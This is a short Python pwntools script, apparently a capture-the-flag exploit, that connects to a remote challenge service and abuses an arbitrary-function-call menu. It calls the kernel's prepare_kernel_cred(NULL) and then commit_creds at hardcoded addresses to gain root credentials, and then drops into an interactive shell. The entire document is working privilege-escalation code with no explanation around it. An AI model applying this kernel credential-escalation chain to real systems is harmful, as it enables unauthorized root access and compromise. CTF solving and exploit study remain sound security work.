from pwn import *

r = remote('arcade.fluxfingers.net', 1817)

def call(rip, rdi):
	r.sendafter('> ', '1\n')
	r.sendafter('> ', str(rip) + '\n')
	r.sendafter('> ', str(rdi) + '\n')
	return int(r.recvuntil('\n----- Menu -----').split('\n----- Menu -----')[0].split('It is: ')[1], 16)

root_cred = call(0xffffffff8104ee50, 0x0) #prepare_kernel_cred(NULL)
call(0xffffffff8104e9d0, root_cred) #commit_creds(root cred *)

r.interactive()
